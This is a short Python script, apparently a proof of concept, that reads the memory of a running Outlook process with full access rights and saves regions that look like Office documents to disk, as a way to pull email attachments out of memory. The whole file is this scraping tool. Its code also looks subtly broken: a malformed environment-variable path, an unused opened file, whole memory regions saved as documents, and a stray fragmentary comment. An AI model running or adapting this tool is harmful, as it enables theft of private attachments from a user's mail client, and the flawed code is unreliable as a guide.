import os
import psutil
import win32api
import win32com.client
import win32process
import win32com
import win32con
from magic import Magic

# objective: proof-of-concept of a possible vulnerability in a Microsoft Outlook add-in which saves attachments to a byte-array, allowing an attacker to extract them from memory.

#this purports to extract such files from the byte array in volatile memory and save them to disk just to show how this could be done

## the 
outlook = win32com.client.Dispatch("Outlook.Application")

file_exts = {
    'docx': ['Microsoft Word 2007+', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1'],
    'pptx': ['Microsoft PowerPoint 2007+', 'PowerPoint 97-2003'],
    'xlsx': ['Microsoft Office 2007+', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.0', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1'],
    # add more file types and their corresponding magic numbers here
}


def check_for_outlook():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.name().lower() == 'outlook.exe':
                pid = proc.pid
                read_process(pid)
                print("Reading process")
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            print("OK, not reading process")
            pass

def read_process(pid):
    handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    base_address = 0
    length = 0
    while True:
        try:
            mbi = win32process.VirtualQueryEx(handle, base_address)
            base_address += mbi.RegionSize
            if (mbi.State == win32con.MEM_COMMIT) and (mbi.Protect == win32con.PAGE_READWRITE):
                data = win32process.ReadProcessMemory(handle, mbi.BaseAddress, mbi.RegionSize)
                try:
                    with open(os.path.expandvars(f"%USERPROFILE\\Documents\\{pid}.bin"), "wb") as ext_file:
                        magic_number = Magic()
                        file_type = magic_number.from_buffer(data[:1024])
                        for ext, magic_nums in file_exts.items():
                            if file_type in magic_nums:
                                output_file_name = f"{pid}.{ext}"
                                with open(output_file_name, "wb") as export_file:
                                    export_file.write(data)
                                print(f"Extraction successful: {output_file_name}")
                                break


                except Exception as e:
                    print("Couldn't read byte-array:", e)
        except:
            break

check_for_outlook()
 